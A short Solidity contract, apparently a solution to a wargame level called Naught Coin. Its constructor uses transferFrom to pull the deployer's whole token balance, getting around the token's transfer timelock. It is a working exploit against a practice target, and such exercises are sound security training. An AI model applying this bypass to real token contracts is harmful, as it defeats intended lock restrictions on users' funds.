// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IERC20} from "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract NaughtCoinHack {
    constructor(address naughtCoinAddress) {
        IERC20(naughtCoinAddress).transferFrom(
            msg.sender,
            address(this),
            IERC20(naughtCoinAddress).balanceOf(msg.sender)
        );
    }
}
